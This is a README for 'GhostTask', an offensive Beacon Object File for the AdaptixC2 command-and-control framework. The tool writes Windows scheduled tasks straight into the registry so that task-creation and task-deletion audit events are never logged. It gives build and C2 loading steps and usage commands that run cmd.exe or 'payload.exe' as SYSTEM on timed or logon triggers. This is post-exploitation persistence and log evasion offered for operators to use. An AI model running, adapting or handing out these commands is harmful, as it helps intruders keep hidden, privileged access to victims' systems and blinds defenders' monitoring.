# GhostTask BOF — Adaptado para AdaptixC2

Creates and deletes Windows scheduled tasks directly in the registry, without using the Task Scheduler API (COM/RPC). This avoids generating audit events 4698 (task created) and 4699 (task deleted).

Original technique: https://cyber.wtf/2022/06/01/windows-registry-analysis-todays-episode-tasks/

---

## Compilation

Requires `mingw-w64`:

```bash
# Ubuntu/Debian
sudo apt install mingw-w64

# Compile both architectures
make all

# x64
make x64

# x86
make x86

# clean
make clean
```

The `.o` objects remain in `_bin/`.

---

## Installation on AdaptixC2

1. Compile the BOF (`make all`).
2. In the AdaptixC2 interface: **AxScript Manager → Load Script** → select `ghost_task.axs`.
3. The `ghost_task_add` and `ghost_task_delete` commands will be available in the console of any Beacon agent.

## Uso

### Create scheduled task

```
# Daily task at 10:30 PM, run cmd.exe as SYSTEM on localhost
ghost_task add -n Task1 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\out.txt" -u SYSTEM -s daily -t 22:30

# Task that runs every 60 seconds
ghost_task add -n Task2 -p C:\Windows\System32\calc.exe -a "" -u SYSTEM -s second -t 60

# Task scheduled for Mondays and Fridays at 09:00
ghost_task add -n Task3 -p C:\ruta\payload.exe -a "" -u SYSTEM -s weekly -t 09:00 -d monday,friday

# Task upon user logon
ghost_task add -n Task4 -p C:\ruta\payload.exe -a "" -u Administrator -s logon
```

### Delete scheduled task

```
ghost_task delete -n Task3
```

## Parameters

| Flag | Namw        | Description                                          | Default   |
|------|-------------|------------------------------------------------------|-----------|
| `-n` | taskname    | Task name                                            | —         |
| `-p` | program     | Full path of the executable                          | —         |
| `-a` | argument    | Executable arguments                                 | `""`      |
| `-u` | username    | User under whom the task is runnin                   | SYSTEM    |
| `-s` | stype       | Trigger type: `second`, `daily`, `weekly`, `logon`   | daily     |
| `-t` | time        | `HH:MM` (daily/weekly) or `N` seconds (second)       | 12:00     |
| `-d` | days        | Days for weekly  (Monday, Tuesday...)                | monday    |

---

## Requirements

- **Target local**: The agent must run in **SYSTEM** context.

> The task is written to the registry, but the Task Scheduler service (Schedule) needs to be restarted in order to load it. This is inherent to the ghost task technique.
